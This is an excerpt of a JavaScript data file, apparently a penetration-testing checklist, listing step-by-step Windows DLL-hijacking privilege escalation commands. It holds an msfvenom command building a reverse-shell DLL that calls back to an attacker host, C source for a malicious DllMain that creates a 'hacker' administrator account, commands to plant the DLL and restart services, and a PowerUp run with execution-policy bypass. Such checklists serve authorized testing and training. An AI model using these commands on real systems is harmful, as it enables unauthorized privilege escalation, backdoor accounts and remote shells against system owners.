...
const PRIVESC_WINDOWS = [
  ...
  { id: "wp24a", text: "DLL HIJACK STEP 1: Find services with non-system paths (DLL search order targets)", cmd: "wmic service get name,pathname,startmode | findstr /v /i \"C:\\Windows\" | findstr /i \"auto\"" },
  { id: "wp24b", text: "DLL HIJACK STEP 2: Check if the service's directory is writable by you", cmd: "icacls \"C:\\Program Files\\VulnApp\\\"" },
  { id: "wp24c", text: "DLL HIJACK STEP 3: If writable — check which DLLs the app tries to load (Procmon filter: Result=NAME NOT FOUND, Path ends with .dll)", cmd: "# Upload Procmon64.exe → run → filter: Process Name = service.exe, Result = NAME NOT FOUND, Path ends with .dll" },
  { id: "wp24d", text: "DLL HIJACK STEP 3 ALT: No Procmon? Manually check for common missing DLLs", cmd: "# Common DLL hijack names: version.dll, wlanapi.dll, CRYPTSP.dll, dwmapi.dll — copy evil.dll as that name to writable app dir" },
  { id: "wp24e", text: "DLL HIJACK STEP 4: Generate malicious DLL on Kali", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f dll -o evil.dll" },
  { id: "wp24f", text: "DLL HIJACK STEP 4 ALT: Compile custom DLL (adduser + reverse shell)", cmd: "# Save as hijack.c → cross-compile: x86_64-w64-mingw32-gcc hijack.c -shared -o evil.dll\n# Code: #include <stdlib.h>\n# #include <windows.h>\n# BOOL APIENTRY DllMain(HANDLE h, DWORD reason, LPVOID r) {\n#   if (reason == DLL_PROCESS_ATTACH) {\n#     system(\"cmd /c net user hacker P@ss! /add && net localgroup administrators hacker /add\");\n#   } return TRUE; }" },
  { id: "wp24g", text: "DLL HIJACK STEP 5: Place DLL in writable app directory with expected name, restart service", cmd: "copy evil.dll \"C:\\Program Files\\VulnApp\\missing.dll\" && sc stop VulnService && sc start VulnService" },
  { id: "wp24h", text: "DLL HIJACK: PowerUp.ps1 can auto-find hijackable DLLs", cmd: "powershell -ep bypass -c \". .\\PowerUp.ps1; Find-ProcessDLLHijack; Find-PathDLLHijack\"" },
...
const AD_MS01_PRIVESC = [
  ...
  { id: "mp10a", text: "DLL HIJACK: Find services with non-system paths + writable dirs", cmd: "wmic service get name,pathname,startmode | findstr /v /i \"C:\\Windows\" | findstr /i \"auto\"" },
  { id: "mp10b", text: "DLL HIJACK: icacls on service directory — need (M) or (W) for your user", cmd: "icacls \"C:\\Program Files\\VulnApp\\\"" },
  { id: "mp10c", text: "DLL HIJACK: Procmon filter → Result=NAME NOT FOUND, Path ends .dll", cmd: "# Procmon64.exe → filter: Process Name = service.exe, Result = NAME NOT FOUND" },
  { id: "mp10d", text: "DLL HIJACK: No Procmon? Try common names: version.dll, wlanapi.dll, CRYPTSP.dll, dwmapi.dll" },
  { id: "mp10e", text: "DLL HIJACK: Generate malicious DLL + place in app dir + restart service", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f dll -o evil.dll && copy evil.dll \"C:\\path\\missing.dll\" && sc stop svc && sc start svc" },
